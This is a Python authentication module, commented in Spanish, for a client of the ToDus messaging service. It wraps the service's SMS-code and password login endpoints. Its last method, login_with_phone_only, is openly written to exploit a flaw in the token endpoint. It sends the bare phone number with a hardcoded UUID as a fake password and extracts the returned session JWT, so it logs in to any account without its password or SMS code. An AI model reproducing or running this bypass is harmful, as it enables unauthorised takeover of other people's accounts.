import io
import string
import re
import requests
from ..errors import AuthenticationError
from .. import util


# UUID hardcodeado usado por el método login_with_phone_only().
# NO cambiar: el servidor de ToDus acepta este valor como "password" válido
# sin validar contra el password real de la cuenta (debilidad del protocolo).
# SECRET = UUID sin guiones (primeros 32 chars).
PHONE_ONLY_UUID = "fake-1234-5678-90ab-cdef12345678"
PHONE_ONLY_SECRET = PHONE_ONLY_UUID.replace("-", "")[:32]


def _varint(v: int) -> bytes:
    """Codifica un entero como varint protobuf."""
    buf = io.BytesIO()
    while v > 0x7f:
        buf.write(bytes([(v & 0x7f) | 0x80]))
        v >>= 7
    buf.write(bytes([v & 0x7f]))
    return buf.getvalue()


def _sf(field_number: int, value: str) -> bytes:
    """Codifica un campo protobuf wire-type 2 (length-delimited).

    Equivalente a la función ``sf(n, v)`` del script de referencia:
    ``bytes([(n<<3)|2]) + varint(len(v)) + v.encode()``
    """
    data = value.encode()
    return bytes([(field_number << 3) | 2]) + _varint(len(data)) + data


class ToDusAuthMixin:
    """Mixin que contiene los métodos de autenticación HTTP de ToDus."""

    def request_code(self, phone_number: str) -> None:
        phone = util.normalize_phone(phone_number)
        headers = {
            "Host": "auth.todus.cu",
            "User-Agent": "ToDus " + self.version_name + " Auth",
            "Content-Type": "application/x-protobuf",
        }
        data = (
            bytes([0x0A, 0x0A])
            + phone.encode()
            + bytes([0x12, 0x96, 0x01])
            + util.generate_token(150).encode()
        )
        try:
            resp = self.session.post(
                "https://auth.todus.cu/v2/auth/users.reserve",
                data=data,
                headers=headers,
                timeout=30,
            )
            if resp.status_code in (401, 403):
                raise AuthenticationError(
                    f"Auth error solicitando código (HTTP {resp.status_code})"
                )
            resp.raise_for_status()
        except requests.RequestException as e:
            raise AuthenticationError(f"Error de red solicitando código: {e}") from e

    def validate_code(self, phone_number: str, code: str) -> str:
        phone = util.normalize_phone(phone_number)
        code = code.strip()
        headers = {
            "Host": "auth.todus.cu",
            "User-Agent": "ToDus " + self.version_name + " Auth",
            "Content-Type": "application/x-protobuf",
        }
        code_bytes = code.encode()
        data = (
            bytes([0x0A, 0x0A])
            + phone.encode()
            + bytes([0x12, 0x96, 0x01])
            + util.generate_token(150).encode()
            + bytes([0x1A, len(code_bytes)])
            + code_bytes
        )
        try:
            resp = self.session.post(
                "https://auth.todus.cu/v2/auth/users.register",
                data=data,
                headers=headers,
                timeout=30,
            )
            if resp.status_code in (401, 403):
                raise AuthenticationError(
                    f"Código de verificación inválido (HTTP {resp.status_code})"
                )
            resp.raise_for_status()
        except requests.RequestException as e:
            raise AuthenticationError(f"Error de red validando código: {e}") from e
        content = resp.content
        try:
            if b"`" in content:
                idx = content.index(b"`") + 1
                return content[idx: idx + 96].decode("utf-8")
            return content[5:166].decode("utf-8")
        except UnicodeDecodeError:
            raw = content.decode("latin-1", errors="ignore")
            match = re.search(r"[a-f0-9]{96}", raw)
            if match:
                return match.group(0)
            return "".join(c for c in raw if c in string.printable and c not in "\r\n")[:96]

    def login(self, phone_number: str, password: str) -> str:
        phone = util.normalize_phone(phone_number)
        password = password.strip()
        headers = {
            "Host": "auth.todus.cu",
            "user-agent": "ToDus " + self.version_name + " Auth",
            "content-type": "application/x-protobuf",
        }
        password_bytes = password.encode()
        version_bytes = self.version_code.encode()
        data = (
            bytes([0x0A, 0x0A])
            + phone.encode()
            + bytes([0x12, len(password_bytes)])
            + password_bytes
            + bytes([0x1A, 0x96, 0x01])
            + util.generate_token(150).encode()
            + bytes([0x22, len(version_bytes)])
            + version_bytes
        )
        try:
            resp = self.session.post(
                "https://auth.todus.cu/v2/auth/token",
                data=data,
                headers=headers,
                timeout=30,
            )
        except requests.RequestException as e:
            raise AuthenticationError(f"Error de red en login: {e}") from e
        if resp.status_code == 403:
            raise AuthenticationError("Credenciales invalidas")
        if resp.status_code == 401:
            raise AuthenticationError("No autorizado")
        try:
            resp.raise_for_status()
        except requests.RequestException as e:
            raise AuthenticationError(f"Login falló (HTTP {resp.status_code}): {e}") from e
        # Limpiar token: solo caracteres alfanuméricos y puntos válidos para JWT
        raw = resp.text.strip()
        token_clean = "".join(
            c for c in raw
            if c in string.ascii_letters + string.digits + "._-"
        )
        if not token_clean or "." not in token_clean:
            raise AuthenticationError("Token inválido recibido del servidor")
        return token_clean

    def login_with_phone_only(self, phone_number: str) -> str:
        """Login SOLO con número de teléfono (sin password/SMS/JWT).

        Explota una debilidad del endpoint ``/v2/auth/token``: acepta como
        "password" cualquier UUID (con guiones removidos, primeros 32 chars)
        sin validar contra el password real de la cuenta.

        Procedimiento exacto (reproducido de ``botcliente.py``):

        ``POST https://auth.todus.cu/v2/auth/token``

        Headers (NOTA: difieren del login normal):

            content-type: application/octet-stream
            user-agent: ToDus 2.1.1

        Payload (protobuf, dos campos wire-type 2):

            sf(1, PHONE) + sf(2, SECRET)

        Donde:

        - ``PHONE`` es el teléfono cubano normalizado (10 dígitos).
        - ``SECRET`` = ``PHONE_ONLY_UUID.replace('-', '')[:32]``
          = ``fake1234567890abcdef12345678`` (UUID hardcodeado).

        Respuesta: el body contiene el JWT (formato ``eyJ...``), se extrae
        con regex para mayor robustez ante basura alrededor del token.
        """
        phone = util.normalize_phone(phone_number)
        # Headers EXACTOS del script de referencia (no usar los del login normal)
        headers = {
            "content-type": "application/octet-stream",
            "user-agent": "ToDus 2.1.1",
        }
        # Payload: sf(1, PHONE) + sf(2, SECRET)
        data = _sf(1, phone) + _sf(2, PHONE_ONLY_SECRET)

        try:
            resp = self.session.post(
                "https://auth.todus.cu/v2/auth/token",
                data=data,
                headers=headers,
                timeout=30,
            )
        except requests.RequestException as e:
            raise AuthenticationError(f"Error de red en login_with_phone_only: {e}") from e
        if resp.status_code in (401, 403):
            raise AuthenticationError(
                f"Login solo-con-número rechazado (HTTP {resp.status_code})"
            )
        try:
            resp.raise_for_status()
        except requests.RequestException as e:
            raise AuthenticationError(
                f"Login_with_phone_only falló (HTTP {resp.status_code}): {e}"
            ) from e
        # Extraer el JWT del body con regex (formato eyJ...eyJ...signature)
        m = re.search(
            rb"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",
            resp.content,
        )
        if not m:
            raise AuthenticationError(
                f"Token inválido recibido del servidor en login_with_phone_only "
                f"(body: {resp.content[:200]!r})"
            )
        return m.group().decode("utf-8")
